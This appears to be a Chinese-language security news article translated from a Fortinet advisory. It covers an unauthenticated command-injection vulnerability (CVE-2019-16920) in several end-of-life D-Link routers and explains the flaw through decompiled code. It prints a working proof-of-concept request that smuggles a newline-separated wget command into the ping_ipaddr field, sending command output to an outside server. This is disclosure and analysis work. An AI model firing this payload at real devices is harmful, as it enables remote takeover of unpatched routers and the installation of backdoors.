![](https://image.3001.net/images/20191009/1570610157_5d9d9bed8517c.png!small)

##  前言

**在2019年的九月份，网络安全公司Fortinet旗下的FortiGuard Labs发现并报告了D-Link产品中一个未经认证的命令注入漏洞（FG-VD-19-117/CVE-2019-16920），而攻击者一旦成功利用该漏洞，那么他们将能够在目标设备上实现远程代码执行（RCE）。目前，研究人员已经将该漏洞评估为高危漏洞，并能够在未经身份验证的情况下远程触发该漏洞。**

根据研究人员的发现，安装了最新版本固件的下列型号D-Link产品将受到该漏洞的影响：

> DIR-655
>
> DIR-866L
>
> DIR-652
>
> DHP-1565

值得一提的是，这些产品厂商目前已经停止对其进行更新了，这也就意味着这个漏洞将不会得到补丁修复。

##  漏洞细节

这个漏洞的根源是因为相关页面以及组件缺少适当的身份验证检测，首先我们从设备的管理员页面开始，然后执行一次登录操作，请求信息如下：

    
    
    POST /apply_sec.cgi HTTP/1.1
    
        Host: 192.168.232.128
    
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
        Accept-Language: en-US,en;q=0.5
    
        Accept-Encoding: gzip, deflate
    
        Content-Type: application/x-www-form-urlencoded
    
        Content-Length: 142
    
        Connection: close
    
        Referer: <http://192.168.232.128/>
    
        Upgrade-Insecure-Requests: 1
    
        html_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&
    
        graph_code=&session_id=62384

登录操作通过URI /apply_sec.cgi执行，简单查看之后，我们发现apply_sec.cgi 的代码位于/www/cgi/ssi的do_ssc
(0x40a210)函数中。

current_user和user_username的值通过nvram调用和获取：

![](https://image.3001.net/images/20191009/1570610198_5d9d9c1635dbb.png!small)

接下来，函数会用current_user的值跟变量acStack160的值进行对比。nvram中current_user的值只将会在用户登录成功后被设置，所以current_user的值默认是不会被初始化的。acStack160的值为user_username经过base64编码后的值，即base64encode(user_username),默认情况下，user_username的值会被设置为“user”，因此iVar2返回的值不可能为“0”，这样就不会跳转到error.asp页面了。

![](https://image.3001.net/images/20191009/1570610204_5d9d9c1c95786.png!small)

在do-while循环代码中，程序会调用put_querystring_env()来解析HTTP
POST请求，然后将值存储在ENV中。接下来，函数会调用query_vars(“action”, acStack288, 0x80)：

![](https://image.3001.net/images/20191009/1570610210_5d9d9c2203a0e.png!small)

这段代码负责提供“action”的值，如果成功，函数将返回“0”值。

如果iVar2等于0，那么就来到了“if”条件判断，它会用URI的值跟字符串“/apply_sec.cgi”进行对比，如果为真，则ppcVar3将指向数组SSC_SEC_OBJS，否则它将指向数组SSC_OBJS。

![](https://image.3001.net/images/20191009/1570610217_5d9d9c29ac6ef.png!small)

现在，ppcVar3指向的是数组SSC_SEC_OBJS，其中包含action值列表，如果我们提供的值不在列表内，程序将返回LAB_0040a458，并输出错误“No
OBJS for action: <action input>”：

![](https://image.3001.net/images/20191009/1570610224_5d9d9c309725d.png!small)

这里同样缺乏适当的身份验证机制，这也就意味着我们可以在“/apply_sec.cgi”路径下执行任何数组SSC_SEC_OBJS中定义的action了。

那么，数组SSC_SEC_OBJS在哪里呢？它在函数init_plugin()的寄存器里：

![](https://image.3001.net/images/20191009/1570610244_5d9d9c447e30e.png!small)

我们跳转到地址0x0051d89c，经过简单处理后我们可看到：

![](https://image.3001.net/images/20191009/1570610261_5d9d9c552a9b4.png!small)

下面这部分字符串和action地址吸引了我们的注意：

![](https://image.3001.net/images/20191009/1570610269_5d9d9c5d303bf.png!small)

当我们跳转到sub_41A010后，这个函数会接收ping_ipaddr的值，然后通过函数inet_aton()和inet_ntoa()来对其进行转换，然后执行ping操作：

![](https://image.3001.net/images/20191009/1570610275_5d9d9c6350d11.png!small)

如果我们尝试输入任意特殊字符，例如双引号、单引号和分号之类的，ping操作将会失效。而当我们传入换行符，例如“8.8.8.8%0als”时，我们将能够执行命令注入攻击！

    
    
    POST /apply_sec.cgi HTTP/1.1
    
        Host: 192.168.232.128
    
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
    
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
        Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
    
        Accept-Encoding: gzip, deflate
    
        Content-Type: application/x-www-form-urlencoded
    
        Content-Length: 131
    
        Connection: close
    
        Referer: <http://192.168.232.128/login_pic.asp>
    
        Cookie: uid=1234123
    
        Upgrade-Insecure-Requests: 1
    
        html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20<http://45.76.148.31:4321/?>$(echo 1234)

这里，我们通过一个POST
HTTP请求来要求“apply_sec.cgi”执行ping_test操作。接下来，在ping_ipaddr中执行命令注入任务。此时，即使我们返回到了登录页面，ping_test的活动仍然会持续执行，ping_ipaddr的值将会在路由服务器中执行命令“echo
1234”，然后将执行结果返回到攻击者控制的服务器端。

![](https://image.3001.net/images/20191009/1570610289_5d9d9c719db17.png!small)

这个时候，攻击者就可以通过其他一系列操作获取到目标设备的管理员密码了，他们甚至还可以在服务器端或路由器端安装后门或木马病毒。

 ***参考来源：[fortinet](https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

